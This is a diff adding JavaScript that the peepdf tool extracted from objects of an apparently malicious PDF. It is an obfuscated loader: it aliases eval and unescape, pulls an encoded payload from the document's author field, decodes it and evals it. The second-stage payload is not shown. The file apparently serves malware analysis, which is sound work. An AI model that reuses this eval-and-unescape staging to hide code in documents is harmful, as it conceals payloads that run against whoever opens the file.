@@ -1,0 +1,17 @@
+// peepdf comment: Javascript code located in object 16 (version 0)
+
+ks('var codes = this.in' + z("%66%6f%2e%61%75%74") + 'hor;');
+
+var xxx = ks('codes.re' + 'pl' + 'ac' + 'e(' + '/lka1/g' + ',prcnt)');
+
+// peepdf comment: Javascript code located in object 26 (version 0)
+
+var vvv = z(unescape(xxx));
+eval(vvv);
+
+// peepdf comment: Javascript code located in object 6 (version 0)
+
+var z = unescape;
+var prcnt = '%';
+var ks = eval;
+
